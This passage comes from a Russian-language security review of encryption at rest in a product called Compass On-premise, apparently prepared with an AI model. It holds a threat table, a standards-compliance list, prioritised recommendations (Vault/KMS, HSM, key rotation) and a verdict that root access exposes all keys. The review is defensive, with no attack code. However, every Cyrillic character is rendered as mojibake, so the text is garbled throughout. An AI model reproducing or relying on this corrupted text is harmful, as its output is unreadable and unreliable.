| –í–Ω–µ—à–Ω–∏–π —Ö–∞–∫–µ—Ä | SQL-–∏–Ω—ä–µ–∫—Ü–∏—è | ‚àû | ‚õî –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ |
| –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä | SSH + sudo | 15-30 –º–∏–Ω | üü° –°—Ä–µ–¥–Ω—è—è |
| –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä | Docker exec | 2-5 –º–∏–Ω | üü¢ –ù–∏–∑–∫–∞—è |
| –§–∏–∑–∏—á–µ—Å–∫–∏–π –¥–æ—Å—Ç—É–ø | –ö—Ä–∞–∂–∞ —Å–µ—Ä–≤–µ—Ä–∞ (–±–µ–∑ FDE) | 10-20 –º–∏–Ω | üü° –°—Ä–µ–¥–Ω—è—è |
| –§–∏–∑–∏—á–µ—Å–∫–∏–π –¥–æ—Å—Ç—É–ø | –ö—Ä–∞–∂–∞ —Å–µ—Ä–≤–µ—Ä–∞ (—Å FDE) | ‚àû | üî¥ –í—ã—Å–æ–∫–∞—è |
| –ò–Ω—Å–∞–π–¥–µ—Ä-—Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫ | –î–æ—Å—Ç—É–ø –∫ –∫–æ–¥—É | –ú–≥–Ω–æ–≤–µ–Ω–Ω–æ | üü¢ –ù–∏–∑–∫–∞—è |

### –°–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞–º

#### ‚úÖ –°–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç:
- **–ì–û–°–¢ –† 34.12-2015** (–ö—É–∑–Ω–µ—á–∏–∫) - –º–æ–∂–Ω–æ –∞–¥–∞–ø—Ç–∏—Ä–æ–≤–∞—Ç—å
- **ISO 27001** - –±–∞–∑–æ–≤—ã–µ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è –∫ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—é
- **GDPR** (—á–∞—Å—Ç–∏—á–Ω–æ) - –∑–∞—â–∏—Ç–∞ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö

#### ‚ùå –ù–ï —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç:
- **PCI DSS 4.0** (Requirement 3.6) - —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ä–æ—Ç–∞—Ü–∏—è –∫–ª—é—á–µ–π
- **FIPS 140-2 Level 3** - –Ω–µ—Ç HSM
- **SOC 2 Type II** - –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π –∞—É–¥–∏—Ç
- **HIPAA** - –Ω–µ—Ç key separation

### –ò—Ç–æ–≥–æ–≤—ã–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ (–ø–æ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞–º)

#### üî¥ –ö–†–ò–¢–ò–ß–ù–û (—Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ):
1. **–†–∞–∑–¥–µ–ª–µ–Ω–∏–µ –∫–ª—é—á–µ–π** - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Vault/KMS –∏–ª–∏ manual unlock
2. **–ê—É–¥–∏—Ç –¥–æ—Å—Ç—É–ø–∞** - –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö –æ–ø–µ—Ä–∞—Ü–∏–π —Å –∫–ª—é—á–∞–º–∏
3. **Full Disk Encryption** - –∑–∞—â–∏—Ç–∞ –ø—Ä–∏ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–π –∫—Ä–∞–∂–µ

#### üü° –í–ê–ñ–ù–û (–≤ —Ç–µ—á–µ–Ω–∏–µ 3-6 –º–µ—Å—è—Ü–µ–≤):
4. **–†–æ—Ç–∞—Ü–∏—è –∫–ª—é—á–µ–π** - –º–µ—Ö–∞–Ω–∏–∑–º —Å–º–µ–Ω—ã –∫–ª—é—á–µ–π –∫–∞–∂–¥—ã–µ 90 –¥–Ω–µ–π
5. **–ó–∞—â–∏—Ç–∞ –ø–∞–º—è—Ç–∏** - mlock() –¥–ª—è –∫–ª—é—á–µ–π
6. **Network segmentation** - –∏–∑–æ–ª—è—Ü–∏—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ —Å –∫–ª—é—á–∞–º–∏

#### üü¢ –ñ–ï–õ–ê–¢–ï–õ–¨–ù–û (–≤ –ø–µ—Ä—Å–ø–µ–∫—Ç–∏–≤–µ):
7. **HSM –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è** - –¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–π –∑–∞—â–∏—Ç—ã
8. **E2E —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ** - –Ω–∞ —É—Ä–æ–≤–Ω–µ –∫–ª–∏–µ–Ω—Ç—Å–∫–∏—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
9. **Zero-knowledge architecture** - —Å–µ—Ä–≤–µ—Ä –Ω–µ –∏–º–µ–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –∫–ª—é—á–∞–º

### –§–∏–Ω–∞–ª—å–Ω—ã–π –≤–µ—Ä–¥–∏–∫—Ç

Compass On-premise —Ä–µ–∞–ª–∏–∑—É–µ—Ç **–±–∞–∑–æ–≤—ã–π —É—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã** —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º at-rest (–¥–∞–Ω–Ω—ã–µ –≤ –ø–æ–∫–æ–µ). –î–ª—è –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–∞ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤ —Å –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏ –∏ —Ñ–∏–∑–∏—á–µ—Å–∫–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é –¶–û–î - **—ç—Ç–æ–≥–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ**.

–û–¥–Ω–∞–∫–æ –¥–ª—è –≤—ã—Å–æ–∫–æ—Ä–∏—Å–∫–æ–≤—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏–π (—Ñ–∏–Ω–∞–Ω—Å—ã, –º–µ–¥–∏—Ü–∏–Ω–∞, –≥–æ—Å—É–¥–∞—Ä—Å—Ç–≤–µ–Ω–Ω—ã–µ –æ—Ä–≥–∞–Ω—ã) **—Ç—Ä–µ–±—É–µ—Ç—Å—è —É—Å–∏–ª–µ–Ω–∏–µ**:
- –í–Ω–µ—à–Ω–∏–π KMS (Vault)
- HSM –¥–ª—è –∫–ª—é—á–µ–π
- –°—Ç—Ä–æ–≥–∏–π –∞—É–¥–∏—Ç

**–ì–ª–∞–≤–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å:** –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Å root-–¥–æ—Å—Ç—É–ø–æ–º –∫ —Å–µ—Ä–≤–µ—Ä—É –º–æ–∂–µ—Ç –∏–∑–≤–ª–µ—á—å –≤—Å–µ –∫–ª—é—á–∏ –∑–∞ 15-30 –º–∏–Ω—É—Ç. –≠—Ç–æ **—Ñ—É–Ω–¥–∞–º–µ–Ω—Ç–∞–ª—å–Ω–æ–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ** on-premise —Å–∏—Å—Ç–µ–º –±–µ–∑ –≤–Ω–µ—à–Ω–µ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–ª—é—á–∞–º–∏.

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è:** –ï—Å–ª–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∑–∞—â–∏—Ç–∞ –æ—Ç –∏–Ω—Å–∞–π–¥–µ—Ä–æ–≤ —Å root-–¥–æ—Å—Ç—É–ø–æ–º ‚Üí –≤–Ω–µ–¥—Ä–∏—Ç—å HashiCorp Vault –∏–ª–∏ HSM.

---

**–î–∞—Ç–∞ –∞–Ω–∞–ª–∏–∑–∞:** 2025-12-04
**–í–µ—Ä—Å–∏—è Compass:** 6.5.0
**–ê–Ω–∞–ª–∏–∑ –ø–æ–¥–≥–æ—Ç–æ–≤–∏–ª:** Claude (Anthropic) –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞ onpremise-installer
